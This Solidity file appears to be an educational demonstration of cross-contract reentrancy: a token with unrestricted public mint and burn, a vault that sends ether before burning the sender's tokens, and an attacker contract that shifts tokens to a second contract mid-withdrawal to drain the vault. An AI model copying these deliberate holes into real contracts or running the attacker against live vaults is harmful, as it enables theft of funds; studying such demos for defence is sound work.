// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {ReentrancyGuard} from "./ReentrancyGuard.sol";

contract DemoToken {
    mapping(address owner => uint256 amount) public balances;
    uint256 public totalSupply;

    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(balances[msg.sender] >= _value, "not enough tokens!");

        balances[msg.sender] -= _value;
        balances[_to] += _value;

        return true;
    }

    function balanceOf(address _owner) external view returns (uint256 balance) {
        return balances[_owner];
    }

    function mint(address _to, uint256 _value) external returns (bool success) {
        balances[_to] += _value;
        totalSupply += _value;
        return true;
    }

    function burn(address _from) external returns (bool success) {
        uint256 amountToBurn = balances[_from];
        balances[_from] -= amountToBurn;
        totalSupply -= amountToBurn;
        return true;
    }
}

contract VaultTokenized is ReentrancyGuard {
    DemoToken public immutable token;

    constructor(DemoToken _token) {
        token = _token;
    }

    function deposit() external payable noReentrancy {
        bool success = token.mint(msg.sender, msg.value);

        require(success, "cannot mint!");
    }

    function withdrawAll() external noReentrancy {
        uint256 balance = token.balanceOf(msg.sender);

        require(balance > 0, "no tokens!");

        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "cannot send eth!");

        success = token.burn(msg.sender);
        require(success, "cannot burn!");
    }
}

contract AttackerTokenized {
    DemoToken public immutable token;
    VaultTokenized public immutable vault;
    AttackerTokenized public attackerSecondary;
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;

    constructor(DemoToken _token, VaultTokenized _vault) {
        token = _token;
        vault = _vault;
    }

    function setSecondaryAttacker(AttackerTokenized _attackerSecondary) external {
        attackerSecondary = _attackerSecondary;
    }

    function attackStep1() external payable {
        vault.deposit{value: DEPOSIT_AMOUNT}();
        vault.withdrawAll();
    }

    function attackStep2() external {
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            token.transfer(address(attackerSecondary), token.balanceOf(address(this)));
        }
    }
}